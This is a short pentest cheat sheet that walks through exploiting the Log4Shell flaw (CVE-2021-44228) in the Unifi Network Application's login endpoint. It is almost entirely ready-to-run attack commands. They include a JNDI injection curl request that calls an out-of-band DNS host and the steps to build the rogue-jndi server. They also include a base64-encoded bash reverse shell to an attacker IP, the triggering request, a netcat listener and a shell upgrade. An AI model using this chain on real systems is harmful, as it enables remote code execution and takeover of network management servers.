---
description: https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
---

# CVE-2021-44228 : Unifi

## Application context

The Unifi Network Application is used to manage Ubiquiti software and hardware solutions. The application is most commonly hosted on port 8443 via HTTPS.

The vulnerability concerns "rememberme" parameter in the login form but it can sometimes concern "username" parameter.

Request example :

```web-idl
POST /api/login HTTP/2
Host: <TARGET> 
Content-Length: 109
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
Sec-Ch-Ua-Mobile: ?0
User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Content-Type: application/json; charset=utf-8
Accept: */*
Origin: https://<TARGET>
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://<TARGET>/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}
```

## Test if the vulnerability is present

* Versions prior to 6.5.54 are vulnerable to remote code execution.
* Request a temporary subdomain on dnslog.cn : toto.cn
* Build a curl request with JNDI injection to trigger request to the temporary subdomain

```bash
curl -i -s -k -X POST -H $'Host: $TARGET:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://toto.cn:1389/o=tomcat}\",\"strict\":true}' $'https://$TARGET:8443/api/login'
```

## Use veracode-research exploit

### Download the exploit

```bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```

### Craft a command to deliver the reverse shell

```bash
echo 'bash -c bash -i >&/dev/tcp/$Attacker_IP/4444 0>&1' | base64

java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xMS41MC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "$ATTACKER_IP"

```

### Get Reverse Shell on target

```bash
curl -i -s -k -X POST -H $'Host: $TARGET:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://$ATTACKER_IP:1389/o=tomcat}\",\"strict\":true}' $'https://$TARGET:8443/api/login'
```

Or use Burp and modify `remember` parameter

### Start up a netcat listener on the port

```bash
nc -lvnp 4444
```

## Upgrade shell terminal

```bash
script /dev/null -c bash
```
